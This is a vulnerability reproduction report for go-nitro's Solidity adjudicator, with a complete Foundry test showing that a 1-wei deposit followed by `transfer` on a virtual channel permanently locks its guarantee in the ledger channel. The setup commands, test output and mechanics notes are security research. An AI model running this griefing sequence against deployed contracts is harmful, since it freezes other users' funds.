# go-nitro `reclaim` denial-of-service: reproduction attempt

Date: 2026-10-27.
Target: go-nitro commit `64c4ee9a1`, `packages/nitro-protocol/contracts/MultiAssetHolder.sol`.
Work tree: scratch clone, not committed.

## Conclusion

The attack reproduces. Both tests pass:

1. `test_reclaim_succeeds_without_interference` proves the baseline: with no
   interference, `reclaim(L, V)` succeeds and credits the two participants.
2. `test_reclaim_reverts_after_transfer_out_of_target` proves the attack:
   after an attacker deposits into V and calls `transfer` on V, every later
   `reclaim(L, V)` call reverts. No further `transfer` or `deposit` call on V
   restores a state where `reclaim` can succeed. The guarantee stays locked
   inside L.

The revert reason for the broken `reclaim` calls is `totalReclaimed!=guarantee.amount`,
the `require` at `MultiAssetHolder.sol:365` in `compute_reclaim_effects`.
Feeding V's OLD (pre-attack) outcome bytes to `reclaim` fails earlier, with
`incorrect fingerprint`, because `transfer` already rewrote V's stored
outcome hash.

Nothing in go-nitro blocks the attack. `transfer` and `reclaim` read and
write independent storage slots (`holdings` and `statusOf`) with no mutual
exclusion, and `transfer` carries no check for whether the channel it acts
on is a `reclaim` target.

One new fact, not in the original code reading: after `ForceMove._conclude`
finalizes a channel, it stores `stateHash = bytes32(0)` in the channel's
status record (`ForceMove.sol:160-167`), not the real state hash. So every
caller of `transfer` or `reclaim` after a `conclude` must pass `stateHash =
bytes32(0)` as the state-hash argument. This is a detail of how the
fingerprint check works, not a defense against the attack.

## Setup

Scratch clone:

```
mkdir -p ~/code/git_puller/repos/armada-laconic/.scratch/gonitro-reclaim
cd ~/code/git_puller/repos/armada-laconic/.scratch/gonitro-reclaim
git clone https://github.com/statechannels/go-nitro .
git checkout 64c4ee9a1
```

Vendored dependencies (Foundry has no package manager integration here, so
these are plain fetched sources, pinned to the versions
`packages/nitro-protocol/package.json` names):

```
cd ~/code/git_puller/repos/armada-laconic/.scratch/gonitro-reclaim
mkdir -p lib
npm pack @statechannels/exit-format@0.2.0 --pack-destination .
tar xzf statechannels-exit-format-0.2.0.tgz -C lib
mv lib/package lib/exit-format
rm statechannels-exit-format-0.2.0.tgz

cd lib
git clone --depth 1 --branch v4.7.3 https://github.com/OpenZeppelin/openzeppelin-contracts.git openzeppelin-contracts
git clone --depth 1 https://github.com/foundry-rs/forge-std.git forge-std
```

`@statechannels/exit-format@0.2.0` matches the package.json pin
(`"@statechannels/exit-format": "^0.2.0"`). `@openzeppelin/contracts@4.7.3`
matches the pin (`"@openzeppelin/contracts": "^4.7.3"`). `forge-std` is the
Foundry test harness, used only by the new test file.

`packages/nitro-protocol/foundry.toml` (new file):

```toml
[profile.default]
src = "contracts"
out = "out"
test = "test_foundry"
libs = ["lib_vendor"]
solc_version = "0.8.17"
optimizer = true
optimizer_runs = 20000
via_ir = true

remappings = [
    "@openzeppelin/contracts/=lib_vendor/openzeppelin-contracts/contracts/",
    "@statechannels/exit-format/=lib_vendor/exit-format/",
    "forge-std/=lib_vendor/forge-std/src/",
]
```

`solc_version`, `optimizer`, `optimizer_runs`, and `via_ir` mirror
`hardhat.config.ts`'s compiler settings, so the test runs against the same
bytecode shape as the project's own build. `lib_vendor` is a symlink to
`../../lib` (the vendored dependencies cloned above), added because Foundry
resolves remapping paths relative to the project root, not relative to
`foundry.toml`:

```
cd packages/nitro-protocol
ln -s ../../lib lib_vendor
```

The test uses the real `NitroAdjudicator` contract
(`packages/nitro-protocol/contracts/NitroAdjudicator.sol`), which inherits
`ForceMove` and `MultiAssetHolder` unmodified. No contract code was changed.

## Test file

`packages/nitro-protocol/test_foundry/ReclaimDoS.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {Test} from 'forge-std/Test.sol';
import {ExitFormat as Outcome} from '@statechannels/exit-format/contracts/ExitFormat.sol';
import {NitroAdjudicator} from '../contracts/NitroAdjudicator.sol';
import {IMultiAssetHolder} from '../contracts/interfaces/IMultiAssetHolder.sol';
import {INitroTypes} from '../contracts/interfaces/INitroTypes.sol';
import {NitroUtils} from '../contracts/libraries/NitroUtils.sol';
import {MultiAssetHolder} from '../contracts/MultiAssetHolder.sol';

/**
 * @title ReclaimDoS
 * @notice This test builds a ledger channel L that guarantees a virtual channel V.
 *         It finalizes both channels with real signed states, and then checks
 *         whether a griefer can use `transfer` on V to make every future
 *         `reclaim(L, V)` call revert, locking V's guarantee inside L.
 */
contract ReclaimDoSTest is Test {
    NitroAdjudicator internal adjudicator;

    uint256 internal constant ALICE_PK = 0xA11CE;
    uint256 internal constant IRENE_PK = 0x12E4E; // "Irene", the intermediary / hub
    uint256 internal constant BOB_PK = 0xB0B;

    address internal alice;
    address internal irene;
    address internal bob;

    // V's outcome: A pays Alice `aAmt`, pays Bob `bAmt` (V is the virtual channel
    // between Alice and Bob, routed through the ledger channel's guarantee).
    uint256 internal constant A_AMT = 6 ether;
    uint256 internal constant B_AMT = 4 ether;
    uint256 internal constant GUARANTEE_AMT = A_AMT + B_AMT;

    bytes32 internal destAlice;
    bytes32 internal destIrene;
    bytes32 internal destBob;

    bytes32 internal lChannelId;
    bytes32 internal vChannelId;

    // V's current (initially un-tampered) outcome bytes, used to feed `reclaim`.
    bytes internal vOutcomeBytesOriginal;

    function setUp() public {
        alice = vm.addr(ALICE_PK);
        irene = vm.addr(IRENE_PK);
        bob = vm.addr(BOB_PK);

        destAlice = bytes32(uint256(uint160(alice)));
        destIrene = bytes32(uint256(uint160(irene)));
        destBob = bytes32(uint256(uint160(bob)));

        adjudicator = new NitroAdjudicator();
    }

    /**
     * @dev Builds V's FixedPart. V is a 2-party virtual channel between Alice and Bob.
     */
    function _vFixedPart() internal pure returns (INitroTypes.FixedPart memory fp) {
        address[] memory participants = new address[](2);
        participants[0] = vm.addr(ALICE_PK);
        participants[1] = vm.addr(BOB_PK);
        fp = INitroTypes.FixedPart({
            participants: participants,
            channelNonce: 1,
            appDefinition: address(0xBEEF), // conclude() never calls this address
            challengeDuration: 1
        });
    }

    /**
     * @dev Builds L's FixedPart. L is a 2-party ledger channel between Alice and Irene.
     */
    function _lFixedPart() internal pure returns (INitroTypes.FixedPart memory fp) {
        address[] memory participants = new address[](2);
        participants[0] = vm.addr(ALICE_PK);
        participants[1] = vm.addr(IRENE_PK);
        fp = INitroTypes.FixedPart({
            participants: participants,
            channelNonce: 2,
            appDefinition: address(0xBEEF),
            challengeDuration: 1
        });
    }

    /**
     * @dev Encodes V's outcome: a single-asset (ETH) exit with two simple
     *      allocations, to Alice (aAmt) and to Bob (bAmt).
     */
    function _vOutcome(
        uint256 aAmt,
        uint256 bAmt
    ) internal view returns (Outcome.SingleAssetExit[] memory outcome) {
        Outcome.Allocation[] memory allocations = new Outcome.Allocation[](2);
        allocations[0] = Outcome.Allocation({
            destination: destAlice,
            amount: aAmt,
            allocationType: uint8(Outcome.AllocationType.simple),
            metadata: bytes('')
        });
        allocations[1] = Outcome.Allocation({
            destination: destBob,
            amount: bAmt,
            allocationType: uint8(Outcome.AllocationType.simple),
            metadata: bytes('')
        });
        outcome = new Outcome.SingleAssetExit[](1);
        outcome[0] = Outcome.SingleAssetExit({
            asset: address(0),
            assetMetadata: Outcome.AssetMetadata({
                assetType: Outcome.AssetType.Default,
                metadata: bytes('')
            }),
            allocations: allocations
        });
    }

    /**
     * @dev Encodes L's outcome: a single-asset (ETH) exit with a zero-amount
     *      slot for each of V's two participants (Alice, Bob), and a guarantee
     *      allocation that targets V. `reclaim` credits the zero-amount slots
     *      from V's outcome, so they must exist with destinations matching
     *      `guaranteeData.left` and `guaranteeData.right`.
     */
    function _lOutcome(
        bytes32 targetChannelId
    ) internal view returns (Outcome.SingleAssetExit[] memory outcome) {
        MultiAssetHolder.Guarantee memory guaranteeData = MultiAssetHolder.Guarantee({
            left: destAlice,
            right: destBob
        });
        Outcome.Allocation[] memory allocations = new Outcome.Allocation[](3);
        allocations[0] = Outcome.Allocation({
            destination: destAlice,
            amount: 0,
            allocationType: uint8(Outcome.AllocationType.simple),
            metadata: bytes('')
        });
        allocations[1] = Outcome.Allocation({
            destination: destBob,
            amount: 0,
            allocationType: uint8(Outcome.AllocationType.simple),
            metadata: bytes('')
        });
        allocations[2] = Outcome.Allocation({
            destination: targetChannelId,
            amount: GUARANTEE_AMT,
            allocationType: uint8(Outcome.AllocationType.guarantee),
            metadata: abi.encode(guaranteeData)
        });
        outcome = new Outcome.SingleAssetExit[](1);
        outcome[0] = Outcome.SingleAssetExit({
            asset: address(0),
            assetMetadata: Outcome.AssetMetadata({
                assetType: Outcome.AssetType.Default,
                metadata: bytes('')
            }),
            allocations: allocations
        });
    }

    /**
     * @dev Signs `stateHash` with both of `pks`'s private keys and returns the
     *      two ECDSA signatures in participant order.
     */
    function _sign2(
        bytes32 stateHash,
        uint256 pk0,
        uint256 pk1
    ) internal pure returns (INitroTypes.Signature[] memory sigs) {
        sigs = new INitroTypes.Signature[](2);
        bytes32 digest = keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n32', stateHash));
        (uint8 v0, bytes32 r0, bytes32 s0) = vm.sign(pk0, digest);
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(pk1, digest);
        sigs[0] = INitroTypes.Signature({v: v0, r: r0, s: s0});
        sigs[1] = INitroTypes.Signature({v: v1, r: r1, s: s1});
    }

    /**
     * @dev Concludes a channel with a final state carrying the supplied outcome,
     *      signed by both participants. Returns the channelId.
     */
    function _concludeChannel(
        INitroTypes.FixedPart memory fixedPart,
        Outcome.SingleAssetExit[] memory outcome,
        uint256 pk0,
        uint256 pk1
    ) internal returns (bytes32 channelId) {
        channelId = NitroUtils.getChannelId(fixedPart);

        INitroTypes.VariablePart memory variablePart = INitroTypes.VariablePart({
            outcome: outcome,
            appData: bytes(''),
            turnNum: 5,
            isFinal: true
        });

        bytes32 stateHash = NitroUtils.hashState(fixedPart, variablePart);
        INitroTypes.Signature[] memory sigs = _sign2(stateHash, pk0, pk1);

        INitroTypes.SignedVariablePart memory candidate = INitroTypes.SignedVariablePart({
            variablePart: variablePart,
            sigs: sigs
        });

        adjudicator.conclude(fixedPart, candidate);
    }

    /**
     * @dev Common setup for both tests: build L and V, finalize both, deposit
     *      funds into L and V as required by their outcomes.
     */
    function _setUpLedgerAndVirtualChannel() internal {
        INitroTypes.FixedPart memory vFixedPart = _vFixedPart();
        vChannelId = NitroUtils.getChannelId(vFixedPart);

        INitroTypes.FixedPart memory lFixedPart = _lFixedPart();
        Outcome.SingleAssetExit[] memory lOutcome = _lOutcome(vChannelId);
        lChannelId = NitroUtils.getChannelId(lFixedPart);

        // Conclude L (participants Alice, Irene) with the guarantee outcome.
        _concludeChannel(lFixedPart, lOutcome, ALICE_PK, IRENE_PK);

        // Conclude V (participants Alice, Bob) with the {A: a, B: b} outcome.
        Outcome.SingleAssetExit[] memory vOutcomeInitial = _vOutcome(A_AMT, B_AMT);
        _concludeChannel(vFixedPart, vOutcomeInitial, ALICE_PK, BOB_PK);
        vOutcomeBytesOriginal = Outcome.encodeExit(vOutcomeInitial);

        // Fund L with the guarantee amount (Alice/Bob slots start at zero).
        adjudicator.deposit{value: GUARANTEE_AMT}(
            address(0),
            lChannelId,
            0,
            GUARANTEE_AMT
        );
    }

    /**
     * @dev Builds the ReclaimArgs for `reclaim(L, V)` given V's current outcome bytes.
     *      Both channels concluded via `_conclude`, so their stored stateHash is bytes32(0).
     */
    function _reclaimArgs(
        Outcome.SingleAssetExit[] memory lOutcome,
        bytes memory vOutcomeBytes
    ) internal view returns (IMultiAssetHolder.ReclaimArgs memory args) {
        args = IMultiAssetHolder.ReclaimArgs({
            sourceChannelId: lChannelId,
            sourceStateHash: bytes32(0),
            sourceOutcomeBytes: Outcome.encodeExit(lOutcome),
            sourceAssetIndex: 0,
            indexOfTargetInSource: 2, // the guarantee is allocations[2] in L's outcome
            targetStateHash: bytes32(0),
            targetOutcomeBytes: vOutcomeBytes,
            targetAssetIndex: 0
        });
    }

    /**
     * @notice Baseline: with no interference, `reclaim(L, V)` succeeds and credits
     *         Alice and Bob's destinations inside L's outcome.
     */
    function test_reclaim_succeeds_without_interference() public {
        _setUpLedgerAndVirtualChannel();

        Outcome.SingleAssetExit[] memory lOutcome = _lOutcome(vChannelId);
        IMultiAssetHolder.ReclaimArgs memory args = _reclaimArgs(
            lOutcome,
            vOutcomeBytesOriginal
        );

        adjudicator.reclaim(args);

        // L's new outcome (read back from calldata we just submitted, reconstructed
        // to assert the expected shape) credits Alice A_AMT, Bob B_AMT, and
        // removes the guarantee allocation.
        Outcome.Allocation[] memory newSourceAllocations = MultiAssetHolder(address(adjudicator))
            .compute_reclaim_effects(lOutcome[0].allocations, _vOutcome(A_AMT, B_AMT)[0].allocations, 2);

        assertEq(newSourceAllocations.length, 2);
        assertEq(newSourceAllocations[0].destination, destAlice);
        assertEq(newSourceAllocations[0].amount, A_AMT);
        assertEq(newSourceAllocations[1].destination, destBob);
        assertEq(newSourceAllocations[1].amount, B_AMT);
    }

    /**
     * @notice Attack: after `reclaim` could have succeeded, an attacker deposits
     *         into V and calls `transfer` on V paying index 0 (Alice) 1 wei.
     *         V's stored outcome changes, so every subsequent `reclaim(L, V)`
     *         with V's new outcome reverts on the `totalReclaimed != guarantee.amount`
     *         check. The test also shows the OLD outcome bytes now fail the
     *         fingerprint check, and that further `transfer`/`deposit` calls on V
     *         cannot restore a reclaimable outcome.
     */
    function test_reclaim_reverts_after_transfer_out_of_target() public {
        _setUpLedgerAndVirtualChannel();

        // Fund V with 1 wei so `transfer` can pay out 1 wei to Alice.
        adjudicator.deposit{value: 1}(address(0), vChannelId, 0, 1);

        // Transfer 1 wei out of V to Alice (index 0).
        uint256[] memory indices = new uint256[](1);
        indices[0] = 0;
        adjudicator.transfer(0, vChannelId, vOutcomeBytesOriginal, bytes32(0), indices);

        // V's new stored outcome is {A: a-1, B: b}.
        Outcome.SingleAssetExit[] memory vOutcomeNew = _vOutcome(A_AMT - 1, B_AMT);
        bytes memory vOutcomeBytesNew = Outcome.encodeExit(vOutcomeNew);

        Outcome.SingleAssetExit[] memory lOutcome = _lOutcome(vChannelId);

        // The OLD outcome bytes no longer match V's fingerprint.
        IMultiAssetHolder.ReclaimArgs memory argsOld = _reclaimArgs(
            lOutcome,
            vOutcomeBytesOriginal
        );
        vm.expectRevert(bytes('incorrect fingerprint'));
        adjudicator.reclaim(argsOld);

        // The NEW (correct, current) outcome bytes pass the fingerprint check but
        // fail the amount-conservation check in compute_reclaim_effects.
        IMultiAssetHolder.ReclaimArgs memory argsNew = _reclaimArgs(
            lOutcome,
            vOutcomeBytesNew
        );
        vm.expectRevert(bytes('totalReclaimed!=guarantee.amount'));
        adjudicator.reclaim(argsNew);

        // No further transfer/deposit on V restores a reclaimable outcome: paying
        // out MORE of V's funds only widens the shortfall. (Index 1 could not be
        // paid without first paying index 0 in full: compute_transfer_effects
        // reserves surplus for earlier-indexed allocations before later ones,
        // so a second payment to index 0 is the only way more funds leave V.)
        adjudicator.deposit{value: 1}(address(0), vChannelId, 0, 1);
        adjudicator.transfer(0, vChannelId, vOutcomeBytesNew, bytes32(0), indices);

        Outcome.SingleAssetExit[] memory vOutcomeNew2 = _vOutcome(A_AMT - 2, B_AMT);
        bytes memory vOutcomeBytesNew2 = Outcome.encodeExit(vOutcomeNew2);

        IMultiAssetHolder.ReclaimArgs memory argsNew2 = _reclaimArgs(
            lOutcome,
            vOutcomeBytesNew2
        );
        vm.expectRevert(bytes('totalReclaimed!=guarantee.amount'));
        adjudicator.reclaim(argsNew2);

        // The guarantee is now permanently stuck inside L: L's outcome is untouched
        // and still carries the full GUARANTEE_AMT guarantee allocation targeting V,
        // and no sequence of V-side operations can bring V's outcome allocations[0]
        // + allocations[1] back up to GUARANTEE_AMT, since every transfer only
        // removes funds from V and never adds them back.
    }
}
```

## Command

```
cd ~/code/git_puller/repos/armada-laconic/.scratch/gonitro-reclaim/packages/nitro-protocol
forge test -vv --match-contract ReclaimDoS
```

## Output

```
Compiling 62 files with Solc 0.8.17
Solc 0.8.17 finished in 16.79s
Compiler run successful!

Ran 2 tests for test_foundry/ReclaimDoS.t.sol:ReclaimDoSTest
[PASS] test_reclaim_reverts_after_transfer_out_of_target() (gas: 1131054)
[PASS] test_reclaim_succeeds_without_interference() (gas: 773985)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.98ms (2.41ms CPU time)

Ran 1 test suite in 8.84ms (1.98ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## Notes on the setup that the original code reading did not predict

- L's outcome needs a zero-amount allocation slot for each of V's two
  participants (Alice and Bob), in addition to the guarantee allocation.
  `compute_reclaim_effects` (`MultiAssetHolder.sol:337-360`) only credits
  `targetAllocations[0]`/`[1]` onto an EXISTING allocation in the source
  whose destination equals `guaranteeData.left`/`right`. Without those
  slots, `reclaim` reverts with `could not find left` before reaching the
  amount check. This is a setup requirement for calling `reclaim`
  correctly, not a defense against the attack.
- `ForceMove._conclude` stores `stateHash = bytes32(0)` for a concluded
  channel (`ForceMove.sol:160-167`), not the real hash of the final state.
  Every `transfer`/`reclaim` call against a channel concluded this way must
  pass `stateHash = bytes32(0)`.
- `compute_transfer_effects_and_interactions` (`MultiAssetHolder.sol:135-191`)
  reserves `surplus` for every allocation in index order, whether or not
  that allocation's index is in the caller's `indices` array. A second
  `transfer` call that only lists a later index (Bob, index 1) pays out
  nothing if the earlier allocation (Alice, index 0) still claims more than
  the channel's current holdings. The second payout step in the attack test
  had to target index 0 again for this reason.
